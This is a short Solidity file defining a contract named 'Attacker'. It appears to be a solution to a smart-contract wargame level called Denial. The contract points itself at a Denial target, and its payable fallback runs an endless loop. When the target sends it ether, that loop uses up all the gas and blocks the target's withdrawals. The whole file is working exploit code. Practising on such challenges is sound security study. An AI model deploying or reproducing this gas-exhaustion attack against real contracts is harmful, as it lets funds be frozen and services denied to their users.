// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract Attacker {
    Denial public denial;

    constructor(address _denial) {
        denial = Denial(payable(_denial));
    }

    fallback() payable external {
        while(true){}
    }
}